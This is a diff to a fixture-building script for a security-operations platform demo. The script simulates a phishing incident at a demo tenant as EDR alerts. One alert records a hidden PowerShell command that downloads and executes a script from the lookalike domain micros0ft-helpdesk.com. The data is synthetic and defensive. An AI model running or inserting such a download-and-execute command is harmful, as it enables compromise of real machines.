@@ -2,7 +2,7 @@
 
     python scripts/build_fixtures.py
 
-Scenario (2026-09-20, tenant cci-demo.com): a credential-phishing campaign from
+Scenario (2026-09-20, tenant acme-demo.com): a credential-phishing campaign from
 micros0ft-helpdesk.com reaches 8 users. Jane clicks, her laptop runs a PowerShell
 payload, a Tor sign-in follows with an inbox forwarding rule, a Canary file-share
 token trips from her laptop and she accesses a privileged Delinea secret. Bob reports
@@ -21,7 +21,7 @@ from pathlib import Path
 
 OUT = Path(__file__).resolve().parents[1] / "soc_platform" / "fixtures"
 D = "2026-09-20T"
-ORG = "cci-demo.com"
+ORG = "acme-demo.com"
 
 USERS = {
     "jane": {"id": "u-jane-0001", "upn": f"jane.doe@{ORG}", "name": "Jane Doe", "dept": "Finance", "title": "Finance Analyst"},
@@ -113,17 +113,17 @@ def crowdstrike() -> None:
                         "tags": ["FalconGroupingTags/Finance"] if k == "jane" else []})
     j = HOSTS["jane"]
     alerts = [
-        {"composite_id": "cci:ind:cs-aid-jane01:0001", "created_timestamp": f"{D}09:09:12Z", "severity": 85,
+        {"composite_id": "acme:ind:cs-aid-jane01:0001", "created_timestamp": f"{D}09:09:12Z", "severity": 85,
          "display_name": "PowerShell downloaded and executed a remote payload", "name": "PowerShellRemotePayload",
          "description": "A PowerShell process spawned by the browser downloaded and executed a script from an external domain.",
          "tactic": "Execution", "technique": "PowerShell", "technique_id": "T1059.001", "confidence": 90,
          "device": {"device_id": j["cs"], "hostname": j["hostname"], "local_ip": j["ip"], "os_version": j["os"],
                     "platform_name": "Windows"},
-         "user_name": "CCI\\jane.doe", "filename": "invoice_viewer.ps1", "sha256": PAYLOAD_SHA,
+         "user_name": "ACME\\jane.doe", "filename": "invoice_viewer.ps1", "sha256": PAYLOAD_SHA,
          "cmdline": "powershell.exe -nop -w hidden -c iex(iwr https://login.micros0ft-helpdesk.com/p.ps1)",
          "parent_details": {"cmdline": "msedge.exe --single-argument https://login.micros0ft-helpdesk.com/verify"},
          "status": "new", "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-jane01:0001"},
-        {"composite_id": "cci:ind:cs-aid-web01:0002", "created_timestamp": f"{D}07:40:00Z", "severity": 30,
+        {"composite_id": "acme:ind:cs-aid-web01:0002", "created_timestamp": f"{D}07:40:00Z", "severity": 30,
          "display_name": "Unusual outbound connection from web server", "name": "UnusualOutbound",
          "description": "Low-confidence network anomaly.", "tactic": "Command and Control",
          "technique": "Application Layer Protocol", "technique_id": "T1071", "confidence": 30,
